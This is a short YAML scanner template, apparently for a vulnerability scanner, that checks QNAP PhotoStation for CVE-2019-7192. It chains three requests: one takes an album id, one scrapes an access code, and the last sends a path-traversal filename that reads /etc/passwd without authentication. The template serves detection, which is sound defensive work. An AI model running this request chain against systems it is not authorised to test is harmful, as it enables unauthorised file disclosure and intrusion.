id: CVE-2019-7192

info:
    name: QNAP PhotoStation Unauthorizated File Read
    author: Hzllaga
    severity: critical

rules:
    r0:
        request:
            method: POST
            path: /photo/p/api/album.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: a=setSlideshow&f=qsamplealbum
        expression: response.status == 200
        output:
            search: '"<output>(?P<album_id>.*?)</output>".bsubmatch(response.body)'
            album_id: search["album_id"]
    r1:
        request:
            method: GET
            path: /photo/slideshow.php?album={{album_id}}
        expression: response.status == 200
        output:
            search: '"encodeURIComponent\\(\\''(?P<access_code>.*?)\\''\\)".bsubmatch(response.body)'
            access_code: search["access_code"]
    r2:
        request:
            method: POST
            path: /photo/p/api/video.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: album={{album_id}}&a=caption&ac={{access_code}}&f=UMGObv&filename=./../../../../../etc/passwd
        expression: response.status == 200 && response.body.bcontains(b"admin:x:0:0")
expression: r0() && r1() && r2()

